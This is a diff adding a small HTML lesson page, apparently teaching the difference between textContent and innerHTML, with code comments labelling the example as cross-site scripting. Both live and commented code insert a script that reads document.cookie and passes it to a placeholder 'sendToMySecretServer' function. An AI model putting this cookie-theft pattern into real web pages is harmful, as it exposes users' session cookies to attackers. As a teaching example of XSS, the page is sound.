@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Document</title>
+        <style>
+            /* Explore: box-sizing */
+            body {
+                margin: 0
+            }
+
+            .banner {
+                padding: 0.6em;
+                background-color: #D81C5B;
+                color: white;
+                font-size: 0.85em;
+                text-align: center;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="banner">
+            Test Date | Blockchain Development | 25-06-2022 at 11:30 AM
+        </div>
+
+        <script>
+            const banner = document.querySelector( '.banner' );
+
+            setTimeout(
+                () => {
+                    // HTML elements are not interpreted
+                    // banner.textContent = `
+                    //     Registrations for Batch 4 - Game Development is Open.
+                    //     <a href="#">Apply Now</a>
+                    // `;
+
+                    // XSS (Cross-Site Scripting)
+                    // banner.innerHTML = `
+                    //     Registrations for Batch 4 - Game Development is Open.
+                    //     <a href="#">Apply Now</a>
+                    //     <script>
+                    //         const cookie = document.cookie;
+                    //         sendToMySecretServer(  cookie );
+                    //     </script>
+                    // `;
+                    banner.innerHTML = `
+                        Registrations for Batch 4 - Game Development is Open.
+                        <a href="#">Apply Now</a>
+                        <script>
+                            const cookie = document.cookie;
+                            sendToMySecretServer(  cookie );
+                        </script>
+                    `;
+                },
+                3000
+            );
+        </script>
+    </body>
+</html>
